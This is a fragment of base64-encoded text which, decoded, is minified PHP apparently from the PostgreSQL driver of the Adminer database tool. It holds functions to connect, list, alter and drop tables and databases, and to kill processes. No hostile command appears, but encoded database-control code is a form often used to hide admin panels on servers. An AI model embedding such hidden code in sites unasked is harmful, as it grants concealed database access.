a2V5cygkTykpLiIpIFZBTFVFUyAoIi5pbXBsb2RlKCIsICIsJE8pLiIpIikpKXJldHVybg0KZmFsc2U7fXJldHVybg0KdHJ1ZTt9fWZ1bmN0aW9uDQppZGZfZXNjYXBlKCR0KXtyZXR1cm4nIicuc3RyX3JlcGxhY2UoJyInLCciIicsJHQpLiciJzt9ZnVuY3Rpb24NCnRhYmxlKCR0KXtyZXR1cm4NCmlkZl9lc2NhcGUoJHQpO31mdW5jdGlvbg0KY29ubmVjdCgpe2dsb2JhbCRiOyRnPW5ldw0KTWluX0RCOyRqPSRiLT5jcmVkZW50aWFscygpO2lmKCRnLT5jb25uZWN0KCRqWzBdLCRqWzFdLCRqWzJdKSl7aWYoJGctPnNlcnZlcl9pbmZvPj05KSRnLT5xdWVyeSgiU0VUIGFwcGxpY2F0aW9uX25hbWUgPSAnQWRtaW5lciciKTtyZXR1cm4kZzt9cmV0dXJuJGctPmVycm9yO31mdW5jdGlvbg0KZ2V0X2RhdGFiYXNlcygpe3JldHVybg0KZ2V0X3ZhbHMoIlNFTEVDVCBkYXRuYW1lIEZST00gcGdfZGF0YWJhc2UgT1JERVIgQlkgZGF0bmFtZSIpO31mdW5jdGlvbg0KbGltaXQoJEgsJFosJHosJEQ9MCwkcmc9IiAiKXtyZXR1cm4iICRIJFoiLigkeiE9PW51bGw/JHJnLiJMSU1JVCAkeiIuKCREPyIgT0ZGU0VUICREIjoiIik6IiIpO31mdW5jdGlvbg0KbGltaXQxKCRILCRaKXtyZXR1cm4iICRIJFoiO31mdW5jdGlvbg0KZGJfY29sbGF0aW9uKCRtLCRtYil7Z2xvYmFsJGc7cmV0dXJuJGctPnJlc3VsdCgiU0hPVyBMQ19DT0xMQVRFIik7fWZ1bmN0aW9uDQplbmdpbmVzKCl7cmV0dXJuDQphcnJheSgpO31mdW5jdGlvbg0KbG9nZ2VkX3VzZXIoKXtnbG9iYWwkZztyZXR1cm4kZy0+cmVzdWx0KCJTRUxFQ1QgdXNlciIpO31mdW5jdGlvbg0KdGFibGVzX2xpc3QoKXskSD0iU0VMRUNUIHRhYmxlX25hbWUsIHRhYmxlX3R5cGUgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIFdIRVJFIHRhYmxlX3NjaGVtYSA9IGN1cnJlbnRfc2NoZW1hKCkiO2lmKHN1cHBvcnQoJ21hdGVyaWFsaXplZHZpZXcnKSkkSC49Ig0KVU5JT04gQUxMDQpTRUxFQ1QgbWF0dmlld25hbWUsICdNQVRFUklBTElaRUQgVklFVycNCkZST00gcGdfbWF0dmlld3MNCldIRVJFIHNjaGVtYW5hbWUgPSBjdXJyZW50X3NjaGVtYSgpIjskSC49Ig0KT1JERVIgQlkgMSI7cmV0dXJuDQpnZXRfa2V5X3ZhbHMoJEgpO31mdW5jdGlvbg0KY291bnRfdGFibGVzKCRsKXtyZXR1cm4NCmFycmF5KCk7fWZ1bmN0aW9uDQp0YWJsZV9zdGF0dXMoJEM9IiIpeyRKPWFycmF5KCk7Zm9yZWFjaChnZXRfcm93cygiU0VMRUNUIHJlbG5hbWUgQVMgXCJOYW1lXCIsIENBU0UgcmVsa2luZCBXSEVOICdyJyBUSEVOICd0YWJsZScgV0hFTiAnbXYnIFRIRU4gJ21hdGVyaWFsaXplZCB2aWV3JyBXSEVOICdmJyBUSEVOICdmb3JlaWduIHRhYmxlJyBFTFNFICd2aWV3JyBFTkQgQVMgXCJFbmdpbmVcIiwgcGdfcmVsYXRpb25fc2l6ZShvaWQpIEFTIFwiRGF0YV9sZW5ndGhcIiwgcGdfdG90YWxfcmVsYXRpb25fc2l6ZShvaWQpIC0gcGdfcmVsYXRpb25fc2l6ZShvaWQpIEFTIFwiSW5kZXhfbGVuZ3RoXCIsIG9ial9kZXNjcmlwdGlvbihvaWQsICdwZ19jbGFzcycpIEFTIFwiQ29tbWVudFwiLCByZWxoYXNvaWRzOjppbnQgQVMgXCJPaWRcIiwgcmVsdHVwbGVzIGFzIFwiUm93c1wiDQpGUk9NIHBnX2NsYXNzDQpXSEVSRSByZWxraW5kIElOICgncicsJ3YnLCdtdicsJ2YnKQ0KQU5EIHJlbG5hbWVzcGFjZSA9IChTRUxFQ1Qgb2lkIEZST00gcGdfbmFtZXNwYWNlIFdIRVJFIG5zcG5hbWUgPSBjdXJyZW50X3NjaGVtYSgpKQ0KIi4oJEMhPSIiPyJBTkQgcmVsbmFtZSA9ICIucSgkQyk6Ik9SREVSIEJZIHJlbG5hbWUiKSlhcyRLKSRKWyRLWyJOYW1lIl1dPSRLO3JldHVybigkQyE9IiI/JEpbJENdOiRKKTt9ZnVuY3Rpb24NCmlzX3ZpZXcoJFIpe3JldHVybg0KaW5fYXJyYXkoJFJbIkVuZ2luZSJdLGFycmF5KCJ2aWV3IiwibWF0ZXJpYWxpemVkIHZpZXciKSk7fWZ1bmN0aW9uDQpma19zdXBwb3J0KCRSKXtyZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQpmaWVsZHMoJFEpeyRKPWFycmF5KCk7JEJhPWFycmF5KCd0aW1lc3RhbXAgd2l0aG91dCB0aW1lIHpvbmUnPT4ndGltZXN0YW1wJywndGltZXN0YW1wIHdpdGggdGltZSB6b25lJz0+J3RpbWVzdGFtcHR6JywpO2ZvcmVhY2goZ2V0X3Jvd3MoIlNFTEVDVCBhLmF0dG5hbWUgQVMgZmllbGQsIGZvcm1hdF90eXBlKGEuYXR0dHlwaWQsIGEuYXR0dHlwbW9kKSBBUyBmdWxsX3R5cGUsIGQuYWRzcmMgQVMgZGVmYXVsdCwgYS5hdHRub3RudWxsOjppbnQsIGNvbF9kZXNjcmlwdGlvbihjLm9pZCwgYS5hdHRudW0pIEFTIGNvbW1lbnQNCkZST00gcGdfY2xhc3MgYw0KSk9JTiBwZ19uYW1lc3BhY2UgbiBPTiBjLnJlbG5hbWVzcGFjZSA9IG4ub2lkDQpKT0lOIHBnX2F0dHJpYnV0ZSBhIE9OIGMub2lkID0gYS5hdHRyZWxpZA0KTEVGVCBKT0lOIHBnX2F0dHJkZWYgZCBPTiBjLm9pZCA9IGQuYWRyZWxpZCBBTkQgYS5hdHRudW0gPSBkLmFkbnVtDQpXSEVSRSBjLnJlbG5hbWUgPSAiLnEoJFEpLiINCkFORCBuLm5zcG5hbWUgPSBjdXJyZW50X3NjaGVtYSgpDQpBTkQgTk9UIGEuYXR0aXNkcm9wcGVkDQpBTkQgYS5hdHRudW0gPiAwDQpPUkRFUiBCWSBhLmF0dG51bSIpYXMkSyl7cHJlZ19tYXRjaCgnfihbXihbXSspKFwoKC4qKVwpKT8oW2EteiBdKyk/KChcW1swLTldKl0pKikkficsJEtbImZ1bGxfdHlwZSJdLCRCKTtsaXN0KCwkVSwkeSwkS1sibGVuZ3RoIl0sJHZhLCRFYSk9JEI7JEtbImxlbmd0aCJdLj0kRWE7JGJiPSRVLiR2YTtpZihpc3NldCgkQmFbJGJiXSkpeyRLWyJ0eXBlIl09JEJhWyRiYl07JEtbImZ1bGxfdHlwZSJdPSRLWyJ0eXBlIl0uJHkuJEVhO31lbHNleyRLWyJ0eXBlIl09JFU7JEtbImZ1bGxfdHlwZSJdPSRLWyJ0eXBlIl0uJHkuJHZhLiRFYTt9JEtbIm51bGwiXT0hJEtbImF0dG5vdG51bGwiXTskS1siYXV0b19pbmNyZW1lbnQiXT1wcmVnX21hdGNoKCd+Xm5leHR2YWxcXCh+aScsJEtbImRlZmF1bHQiXSk7JEtbInByaXZpbGVnZXMiXT1hcnJheSgiaW5zZXJ0Ij0+MSwic2VsZWN0Ij0+MSwidXBkYXRlIj0+MSk7aWYocHJlZ19tYXRjaCgnfiguKyk6OlteKV0rKC4qKX4nLCRLWyJkZWZhdWx0Il0sJEIpKSRLWyJkZWZhdWx0Il09KCRCWzFdWzBdPT0iJyI/aWRmX3VuZXNjYXBlKCRCWzFdKTokQlsxXSkuJEJbMl07JEpbJEtbImZpZWxkIl1dPSRLO31yZXR1cm4kSjt9ZnVuY3Rpb24NCmluZGV4ZXMoJFEsJGg9bnVsbCl7Z2xvYmFsJGc7aWYoIWlzX29iamVjdCgkaCkpJGg9JGc7JEo9YXJyYXkoKTskUmc9JGgtPnJlc3VsdCgiU0VMRUNUIG9pZCBGUk9NIHBnX2NsYXNzIFdIRVJFIHJlbG5hbWVzcGFjZSA9IChTRUxFQ1Qgb2lkIEZST00gcGdfbmFtZXNwYWNlIFdIRVJFIG5zcG5hbWUgPSBjdXJyZW50X3NjaGVtYSgpKSBBTkQgcmVsbmFtZSA9ICIucSgkUSkpOyRmPWdldF9rZXlfdmFscygiU0VMRUNUIGF0dG51bSwgYXR0bmFtZSBGUk9NIHBnX2F0dHJpYnV0ZSBXSEVSRSBhdHRyZWxpZCA9ICRSZyBBTkQgYXR0bnVtID4gMCIsJGgpO2ZvcmVhY2goZ2V0X3Jvd3MoIlNFTEVDVCByZWxuYW1lLCBpbmRpc3VuaXF1ZTo6aW50LCBpbmRpc3ByaW1hcnk6OmludCwgaW5ka2V5LCBpbmRvcHRpb24gRlJPTSBwZ19pbmRleCBpLCBwZ19jbGFzcyBjaSBXSEVSRSBpLmluZHJlbGlkID0gJFJnIEFORCBjaS5vaWQgPSBpLmluZGV4cmVsaWQiLCRoKWFzJEspeyRWZj0kS1sicmVsbmFtZSJdOyRKWyRWZl1bInR5cGUiXT0oJEtbImluZGlzcHJpbWFyeSJdPyJQUklNQVJZIjooJEtbImluZGlzdW5pcXVlIl0/IlVOSVFVRSI6IklOREVYIikpOyRKWyRWZl1bImNvbHVtbnMiXT1hcnJheSgpO2ZvcmVhY2goZXhwbG9kZSgiICIsJEtbImluZGtleSJdKWFzJG9kKSRKWyRWZl1bImNvbHVtbnMiXVtdPSRmWyRvZF07JEpbJFZmXVsiZGVzY3MiXT1hcnJheSgpO2ZvcmVhY2goZXhwbG9kZSgiICIsJEtbImluZG9wdGlvbiJdKWFzJHBkKSRKWyRWZl1bImRlc2NzIl1bXT0oJHBkJjE/JzEnOm51bGwpOyRKWyRWZl1bImxlbmd0aHMiXT1hcnJheSgpO31yZXR1cm4kSjt9ZnVuY3Rpb24NCmZvcmVpZ25fa2V5cygkUSl7Z2xvYmFsJEplOyRKPWFycmF5KCk7Zm9yZWFjaChnZXRfcm93cygiU0VMRUNUIGNvbm5hbWUsIHBnX2dldF9jb25zdHJhaW50ZGVmKG9pZCkgQVMgZGVmaW5pdGlvbg0KRlJPTSBwZ19jb25zdHJhaW50DQpXSEVSRSBjb25yZWxpZCA9IChTRUxFQ1QgcGMub2lkIEZST00gcGdfY2xhc3MgQVMgcGMgSU5ORVIgSk9JTiBwZ19uYW1lc3BhY2UgQVMgcG4gT04gKHBuLm9pZCA9IHBjLnJlbG5hbWVzcGFjZSkgV0hFUkUgcGMucmVsbmFtZSA9ICIucSgkUSkuIiBBTkQgcG4ubnNwbmFtZSA9IGN1cnJlbnRfc2NoZW1hKCkpDQpBTkQgY29udHlwZSA9ICdmJzo6Y2hhcg0KT1JERVIgQlkgY29ua2V5LCBjb25uYW1lIilhcyRLKXtpZihwcmVnX21hdGNoKCd+Rk9SRUlHTiBLRVlccypcKCguKylcKVxzKlJFRkVSRU5DRVMgKC4rKVwoKC4rKVwpKC4qKSR+aUEnLCRLWydkZWZpbml0aW9uJ10sJEIpKXskS1snc291cmNlJ109YXJyYXlfbWFwKCd0cmltJyxleHBsb2RlKCcsJywkQlsxXSkpO2lmKHByZWdfbWF0Y2goJ35eKCgiKFteIl18IiIpKyJ8W14iXSspXC4pPyI/KCIoW14iXXwiIikrInxbXiJdKykkficsJEJbMl0sJFpkKSl7JEtbJ25zJ109c3RyX3JlcGxhY2UoJyIiJywnIicscHJlZ19yZXBsYWNlKCd+XiIoLispIiR+JywnXDEnLCRaZFsyXSkpOyRLWyd0YWJsZSddPXN0cl9yZXBsYWNlKCciIicsJyInLHByZWdfcmVwbGFjZSgnfl4iKC4rKSIkficsJ1wxJywkWmRbNF0pKTt9JEtbJ3RhcmdldCddPWFycmF5X21hcCgndHJpbScsZXhwbG9kZSgnLCcsJEJbM10pKTskS1snb25fZGVsZXRlJ109KHByZWdfbWF0Y2goIn5PTiBERUxFVEUgKCRKZSl+IiwkQls0XSwkWmQpPyRaZFsxXTonTk8gQUNUSU9OJyk7JEtbJ29uX3VwZGF0ZSddPShwcmVnX21hdGNoKCJ+T04gVVBEQVRFICgkSmUpfiIsJEJbNF0sJFpkKT8kWmRbMV06J05PIEFDVElPTicpOyRKWyRLWydjb25uYW1lJ11dPSRLO319cmV0dXJuJEo7fWZ1bmN0aW9uDQp2aWV3KCRDKXtnbG9iYWwkZztyZXR1cm4NCmFycmF5KCJzZWxlY3QiPT4kZy0+cmVzdWx0KCJTRUxFQ1QgcGdfZ2V0X3ZpZXdkZWYoIi5xKCRDKS4iKSIpKTt9ZnVuY3Rpb24NCmNvbGxhdGlvbnMoKXtyZXR1cm4NCmFycmF5KCk7fWZ1bmN0aW9uDQppbmZvcm1hdGlvbl9zY2hlbWEoJG0pe3JldHVybigkbT09ImluZm9ybWF0aW9uX3NjaGVtYSIpO31mdW5jdGlvbg0KZXJyb3IoKXtnbG9iYWwkZzskSj1oKCRnLT5lcnJvcik7aWYocHJlZ19tYXRjaCgnfl4oLipcXG4pPyhbXlxcbl0qKVxcbiggKilcXF4oXFxuLiopPyR+cycsJEosJEIpKSRKPSRCWzFdLnByZWdfcmVwbGFjZSgnfigoPzpbXiZdfCZbXjtdKjspeycuc3RybGVuKCRCWzNdKS4nfSkoLiopficsJ1xcMTxiPlxcMjwvYj4nLCRCWzJdKS4kQls0XTtyZXR1cm4NCm5sX2JyKCRKKTt9ZnVuY3Rpb24NCmNyZWF0ZV9kYXRhYmFzZSgkbSwkZCl7cmV0dXJuDQpxdWVyaWVzKCJDUkVBVEUgREFUQUJBU0UgIi5pZGZfZXNjYXBlKCRtKS4oJGQ/IiBFTkNPRElORyAiLmlkZl9lc2NhcGUoJGQpOiIiKSk7fWZ1bmN0aW9uDQpkcm9wX2RhdGFiYXNlcygkbCl7Z2xvYmFsJGc7JGctPmNsb3NlKCk7cmV0dXJuDQphcHBseV9xdWVyaWVzKCJEUk9QIERBVEFCQVNFIiwkbCwnaWRmX2VzY2FwZScpO31mdW5jdGlvbg0KcmVuYW1lX2RhdGFiYXNlKCRDLCRkKXtyZXR1cm4NCnF1ZXJpZXMoIkFMVEVSIERBVEFCQVNFICIuaWRmX2VzY2FwZShEQikuIiBSRU5BTUUgVE8gIi5pZGZfZXNjYXBlKCRDKSk7fWZ1bmN0aW9uDQphdXRvX2luY3JlbWVudCgpe3JldHVybiIiO31mdW5jdGlvbg0KYWx0ZXJfdGFibGUoJFEsJEMsJHAsJEtjLCRxYiwkbGMsJGQsJEthLCRrZil7JGM9YXJyYXkoKTskSWY9YXJyYXkoKTtmb3JlYWNoKCRwDQphcyRvKXskZT1pZGZfZXNjYXBlKCRvWzBdKTskWD0kb1sxXTtpZighJFgpJGNbXT0iRFJPUCAkZSI7ZWxzZXskUGg9JFhbNV07dW5zZXQoJFhbNV0pO2lmKGlzc2V0KCRYWzZdKSYmJG9bMF09PSIiKSRYWzFdPSgkWFsxXT09ImJpZ2ludCI/IiBiaWciOiIgIikuInNlcmlhbCI7aWYoJG9bMF09PSIiKSRjW109KCRRIT0iIj8iQUREICI6IiAgIikuaW1wbG9kZSgkWCk7ZWxzZXtpZigkZSE9JFhbMF0pJElmW109IkFMVEVSIFRBQkxFICIudGFibGUoJFEpLiIgUkVOQU1FICRlIFRPICRYWzBdIjskY1tdPSJBTFRFUiAkZSBUWVBFJFhbMV0iO2lmKCEkWFs2XSl7JGNbXT0iQUxURVIgJGUgIi4oJFhbM10/IlNFVCRYWzNdIjoiRFJPUCBERUZBVUxUIik7JGNbXT0iQUxURVIgJGUgIi4oJFhbMl09PSIgTlVMTCI/IkRST1AgTk9UIjoiU0VUIikuJFhbMl07fX1pZigkb1swXSE9IiJ8fCRQaCE9IiIpJElmW109IkNPTU1FTlQgT04gQ09MVU1OICIudGFibGUoJFEpLiIuJFhbMF0gSVMgIi4oJFBoIT0iIj9zdWJzdHIoJFBoLDkpOiInJyIpO319JGM9YXJyYXlfbWVyZ2UoJGMsJEtjKTtpZigkUT09IiIpYXJyYXlfdW5zaGlmdCgkSWYsIkNSRUFURSBUQUJMRSAiLnRhYmxlKCRDKS4iIChcbiIuaW1wbG9kZSgiLFxuIiwkYykuIlxuKSIpO2Vsc2VpZigkYylhcnJheV91bnNoaWZ0KCRJZiwiQUxURVIgVEFCTEUgIi50YWJsZSgkUSkuIlxuIi5pbXBsb2RlKCIsXG4iLCRjKSk7aWYoJFEhPSIiJiYkUSE9JEMpJElmW109IkFMVEVSIFRBQkxFICIudGFibGUoJFEpLiIgUkVOQU1FIFRPICIudGFibGUoJEMpO2lmKCRRIT0iInx8JHFiIT0iIikkSWZbXT0iQ09NTUVOVCBPTiBUQUJMRSAiLnRhYmxlKCRDKS4iIElTICIucSgkcWIpO2lmKCRLYSE9IiIpe31mb3JlYWNoKCRJZg0KYXMkSCl7aWYoIXF1ZXJpZXMoJEgpKXJldHVybg0KZmFsc2U7fXJldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCmFsdGVyX2luZGV4ZXMoJFEsJGMpeyRpPWFycmF5KCk7JFdiPWFycmF5KCk7JElmPWFycmF5KCk7Zm9yZWFjaCgkYw0KYXMkWCl7aWYoJFhbMF0hPSJJTkRFWCIpJGlbXT0oJFhbMl09PSJEUk9QIj8iXG5EUk9QIENPTlNUUkFJTlQgIi5pZGZfZXNjYXBlKCRYWzFdKToiXG5BREQiLigkWFsxXSE9IiI/IiBDT05TVFJBSU5UICIuaWRmX2VzY2FwZSgkWFsxXSk6IiIpLiIgJFhbMF0gIi4oJFhbMF09PSJQUklNQVJZIj8iS0VZICI6IiIpLiIoIi5pbXBsb2RlKCIsICIsJFhbMl0pLiIpIik7ZWxzZWlmKCRYWzJdPT0iRFJPUCIpJFdiW109aWRmX2VzY2FwZSgkWFsxXSk7ZWxzZSRJZltdPSJDUkVBVEUgSU5ERVggIi5pZGZfZXNjYXBlKCRYWzFdIT0iIj8kWFsxXTp1bmlxaWQoJFEuIl8iKSkuIiBPTiAiLnRhYmxlKCRRKS4iICgiLmltcGxvZGUoIiwgIiwkWFsyXSkuIikiO31pZigkaSlhcnJheV91bnNoaWZ0KCRJZiwiQUxURVIgVEFCTEUgIi50YWJsZSgkUSkuaW1wbG9kZSgiLCIsJGkpKTtpZigkV2IpYXJyYXlfdW5zaGlmdCgkSWYsIkRST1AgSU5ERVggIi5pbXBsb2RlKCIsICIsJFdiKSk7Zm9yZWFjaCgkSWYNCmFzJEgpe2lmKCFxdWVyaWVzKCRIKSlyZXR1cm4NCmZhbHNlO31yZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQp0cnVuY2F0ZV90YWJsZXMoJFMpe3JldHVybg0KcXVlcmllcygiVFJVTkNBVEUgIi5pbXBsb2RlKCIsICIsYXJyYXlfbWFwKCd0YWJsZScsJFMpKSk7cmV0dXJuDQp0cnVlO31mdW5jdGlvbg0KZHJvcF92aWV3cygkVmgpe3JldHVybg0KZHJvcF90YWJsZXMoJFZoKTt9ZnVuY3Rpb24NCmRyb3BfdGFibGVzKCRTKXtmb3JlYWNoKCRTDQphcyRRKXskRmc9dGFibGVfc3RhdHVzKCRRKTtpZighcXVlcmllcygiRFJPUCAiLnN0cnRvdXBwZXIoJEZnWyJFbmdpbmUiXSkuIiAiLnRhYmxlKCRRKSkpcmV0dXJuDQpmYWxzZTt9cmV0dXJuDQp0cnVlO31mdW5jdGlvbg0KbW92ZV90YWJsZXMoJFMsJFZoLCRZZyl7Zm9yZWFjaChhcnJheV9tZXJnZSgkUywkVmgpYXMkUSl7JEZnPXRhYmxlX3N0YXR1cygkUSk7aWYoIXF1ZXJpZXMoIkFMVEVSICIuc3RydG91cHBlcigkRmdbIkVuZ2luZSJdKS4iICIudGFibGUoJFEpLiIgU0VUIFNDSEVNQSAiLmlkZl9lc2NhcGUoJFlnKSkpcmV0dXJuDQpmYWxzZTt9cmV0dXJuDQp0cnVlO31mdW5jdGlvbg0KdHJpZ2dlcigkQyl7aWYoJEM9PSIiKXJldHVybg0KYXJyYXkoIlN0YXRlbWVudCI9PiJFWEVDVVRFIFBST0NFRFVSRSAoKSIpOyRMPWdldF9yb3dzKCdTRUxFQ1QgdHJpZ2dlcl9uYW1lIEFTICJUcmlnZ2VyIiwgY29uZGl0aW9uX3RpbWluZyBBUyAiVGltaW5nIiwgZXZlbnRfbWFuaXB1bGF0aW9uIEFTICJFdmVudCIsIFwnRk9SIEVBQ0ggXCcgfHwgYWN0aW9uX29yaWVudGF0aW9uIEFTICJUeXBlIiwgYWN0aW9uX3N0YXRlbWVudCBBUyAiU3RhdGVtZW50IiBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50cmlnZ2VycyBXSEVSRSBldmVudF9vYmplY3RfdGFibGUgPSAnLnEoJF9HRVRbInRyaWdnZXIiXSkuJyBBTkQgdHJpZ2dlcl9uYW1lID0gJy5xKCRDKSk7cmV0dXJuDQpyZXNldCgkTCk7fWZ1bmN0aW9uDQp0cmlnZ2VycygkUSl7JEo9YXJyYXkoKTtmb3JlYWNoKGdldF9yb3dzKCJTRUxFQ1QgKiBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50cmlnZ2VycyBXSEVSRSBldmVudF9vYmplY3RfdGFibGUgPSAiLnEoJFEpKWFzJEspJEpbJEtbInRyaWdnZXJfbmFtZSJdXT1hcnJheSgkS1siY29uZGl0aW9uX3RpbWluZyJdLCRLWyJldmVudF9tYW5pcHVsYXRpb24iXSk7cmV0dXJuJEo7fWZ1bmN0aW9uDQp0cmlnZ2VyX29wdGlvbnMoKXtyZXR1cm4NCmFycmF5KCJUaW1pbmciPT5hcnJheSgiQkVGT1JFIiwiQUZURVIiKSwiRXZlbnQiPT5hcnJheSgiSU5TRVJUIiwiVVBEQVRFIiwiREVMRVRFIiksIlR5cGUiPT5hcnJheSgiRk9SIEVBQ0ggUk9XIiwiRk9SIEVBQ0ggU1RBVEVNRU5UIiksKTt9ZnVuY3Rpb24NCnJvdXRpbmVzKCl7cmV0dXJuDQpnZXRfcm93cygnU0VMRUNUIHAucHJvbmFtZSBBUyAiUk9VVElORV9OQU1FIiwgcC5wcm9hcmd0eXBlcyBBUyAiUk9VVElORV9UWVBFIiwgcGdfY2F0YWxvZy5mb3JtYXRfdHlwZShwLnByb3JldHR5cGUsIE5VTEwpIEFTICJEVERfSURFTlRJRklFUiINCkZST00gcGdfY2F0YWxvZy5wZ19uYW1lc3BhY2Ugbg0KSk9JTiBwZ19jYXRhbG9nLnBnX3Byb2MgcCBPTiBwLnByb25hbWVzcGFjZSA9IG4ub2lkDQpXSEVSRSBuLm5zcG5hbWUgPSBjdXJyZW50X3NjaGVtYSgpDQpPUkRFUiBCWSBwLnByb25hbWUnKTt9ZnVuY3Rpb24NCnJvdXRpbmVfbGFuZ3VhZ2VzKCl7cmV0dXJuDQpnZXRfdmFscygiU0VMRUNUIGxhbmduYW1lIEZST00gcGdfY2F0YWxvZy5wZ19sYW5ndWFnZSIpO31mdW5jdGlvbg0KbGFzdF9pZCgpe3JldHVybg0KMDt9ZnVuY3Rpb24NCmV4cGxhaW4oJGcsJEgpe3JldHVybiRnLT5xdWVyeSgiRVhQTEFJTiAkSCIpO31mdW5jdGlvbg0KZm91bmRfcm93cygkUiwkWil7Z2xvYmFsJGc7aWYocHJlZ19tYXRjaCgifiByb3dzPShbMC05XSspfiIsJGctPnJlc3VsdCgiRVhQTEFJTiBTRUxFQ1QgKiBGUk9NICIuaWRmX2VzY2FwZSgkUlsiTmFtZSJdKS4oJFo/IiBXSEVSRSAiLmltcGxvZGUoIiBBTkQgIiwkWik6IiIpKSwkVWYpKXJldHVybiRVZlsxXTtyZXR1cm4NCmZhbHNlO31mdW5jdGlvbg0KdHlwZXMoKXtyZXR1cm4NCmdldF92YWxzKCJTRUxFQ1QgdHlwbmFtZQ0KRlJPTSBwZ190eXBlDQpXSEVSRSB0eXBuYW1lc3BhY2UgPSAoU0VMRUNUIG9pZCBGUk9NIHBnX25hbWVzcGFjZSBXSEVSRSBuc3BuYW1lID0gY3VycmVudF9zY2hlbWEoKSkNCkFORCB0eXB0eXBlIElOICgnYicsJ2QnLCdlJykNCkFORCB0eXBlbGVtID0gMCIpO31mdW5jdGlvbg0Kc2NoZW1hcygpe3JldHVybg0KZ2V0X3ZhbHMoIlNFTEVDVCBuc3BuYW1lIEZST00gcGdfbmFtZXNwYWNlIE9SREVSIEJZIG5zcG5hbWUiKTt9ZnVuY3Rpb24NCmdldF9zY2hlbWEoKXtnbG9iYWwkZztyZXR1cm4kZy0+cmVzdWx0KCJTRUxFQ1QgY3VycmVudF9zY2hlbWEoKSIpO31mdW5jdGlvbg0Kc2V0X3NjaGVtYSgka2cpe2dsb2JhbCRnLCR6aCwkSWc7JEo9JGctPnF1ZXJ5KCJTRVQgc2VhcmNoX3BhdGggVE8gIi5pZGZfZXNjYXBlKCRrZykpO2ZvcmVhY2godHlwZXMoKWFzJFUpe2lmKCFpc3NldCgkemhbJFVdKSl7JHpoWyRVXT0wOyRJZ1snVXNlciB0eXBlcyddW109JFU7fX1yZXR1cm4kSjt9ZnVuY3Rpb24NCnVzZV9zcWwoJGspe3JldHVybiJcY29ubmVjdCAiLmlkZl9lc2NhcGUoJGspO31mdW5jdGlvbg0Kc2hvd192YXJpYWJsZXMoKXtyZXR1cm4NCmdldF9rZXlfdmFscygiU0hPVyBBTEwiKTt9ZnVuY3Rpb24NCnByb2Nlc3NfbGlzdCgpe2dsb2JhbCRnO3JldHVybg0KZ2V0X3Jvd3MoIlNFTEVDVCAqIEZST00gcGdfc3RhdF9hY3Rpdml0eSBPUkRFUiBCWSAiLigkZy0+c2VydmVyX2luZm88OS4yPyJwcm9jcGlkIjoicGlkIikpO31mdW5jdGlvbg0Kc2hvd19zdGF0dXMoKXt9ZnVuY3Rpb24NCmNvbnZlcnRfZmllbGQoJG8pe31mdW5jdGlvbg0KdW5jb252ZXJ0X2ZpZWxkKCRvLCRKKXtyZXR1cm4kSjt9ZnVuY3Rpb24NCnN1cHBvcnQoJERjKXtnbG9iYWwkZztyZXR1cm4NCnByZWdfbWF0Y2goJ35eKGRhdGFiYXNlfHRhYmxlfGNvbHVtbnN8c3FsfGluZGV4ZXN8Y29tbWVudHx2aWV3fCcuKCRnLT5zZXJ2ZXJfaW5mbz49OS4zPydtYXRlcmlhbGl6ZWR2aWV3fCc6JycpLidzY2hlbWV8cHJvY2Vzc2xpc3R8c2VxdWVuY2V8dHJpZ2dlcnx0eXBlfHZhcmlhYmxlc3xkcm9wX2NvbHxraWxsKSR+JywkRGMpO31mdW5jdGlvbg0Ka2lsbF9wcm9jZXNzKCRYKXtyZXR1cm4NCnF1ZXJpZXMoIlNFTEVDVCBwZ190ZXJtaW5hdGVfYmFja2VuZCgiLm51bWJlcigkWCkuIikiKTt9ZnVuY3Rpb24NCm1heF9jb25uZWN0aW9ucygpe2dsb2JhbCRnO3JldHVybiRnLT5yZXN1bHQoIlNIT1cgbWF4X2Nvbm5lY3Rpb25zIik7fSR3PSJwZ3NxbCI7JHpoPWFycmF5KCk7JElnPWFycmF5KCk7Zm9yZWFjaChhcnJheSgnTnVtYmVycyc9PmFycmF5KCJzbWFsbGludCI9PjUsImludGVnZXIiPT4xMCwiYmlnaW50Ij0+MTksImJvb2xlYW4iPT4xLCJudW1lcmljIj0+MCwicmVhbCI9PjcsImRvdWJsZSBwcmVjaXNpb24iPT4xNiwibW9uZXkiPT4yMCksJ0RhdGUgYW5kIHRpbWUnPT5hcnJheSgiZGF0ZSI9PjEzLCJ0aW1lIj0+MTcsInRpbWVzdGFtcCI9PjIwLCJ0aW1lc3RhbXB0eiI9PjIxLCJpbnRlcnZhbCI9PjApLCdTdHJpbmdzJz0+YXJyYXkoImNoYXJhY3RlciI9PjAsImNoYXJhY3RlciB2YXJ5aW5nIj0+MCwidGV4dCI9PjAsInRzcXVlcnkiPT4wLCJ0c3ZlY3RvciI9PjAsInV1aWQiPT4wLCJ4bWwiPT4wKSwnQmluYXJ5Jz0+YXJyYXkoImJpdCI9PjAsImJpdCB2YXJ5aW5nIj0+MCwiYnl0ZWEiPT4wKSwnTmV0d29yayc9PmFycmF5KCJjaWRyIj0+NDMsImluZXQiPT40MywibWFjYWRkciI9PjE3LCJ0eGlkX3NuYXBzaG90Ij0+MCksJ0dlb21ldHJ5Jz0+YXJyYXkoImJveCI9PjAsImNpcmNsZSI9PjAsImxpbmUiPT4wLCJsc2VnIj0+MCwicGF0aCI9PjAsInBvaW50Ij0+MCwicG9seWdvbiI9PjApLClhcyR4PT4kWCl7JHpoKz0kWDskSWdbJHhdPWFycmF5X2tleXMoJFgpO30kRmg9YXJyYXkoKTskT2U9YXJyYXkoIj0iLCI8IiwiPiIsIjw9IiwiPj0iLCIhPSIsIn4iLCIhfiIsIkxJS0UiLCJMSUtFICUlIiwiSUxJS0UiLCJJTElLRSAlJSIsIklOIiwiSVMgTlVMTCIsIk5PVCBMSUtFIiwiTk9UIElOIiwiSVMgTk9UIE5VTEwiKTskU2M9YXJyYXkoImNoYXJfbGVuZ3RoIiwibG93ZXIiLCJyb3VuZCIsInRvX2hleCIsInRvX3RpbWVzdGFtcCIsInVwcGVyIik7JFhjPWFycmF5KCJhdmciLCJjb3VudCIsImNvdW50IGRpc3RpbmN0IiwibWF4IiwibWluIiwic3VtIik7JGRjPWFycmF5KGFycmF5KCJjaGFyIj0+Im1kNSIsImRhdGV8dGltZSI9PiJub3ciLCksYXJyYXkoImludHxudW1lcmljfHJ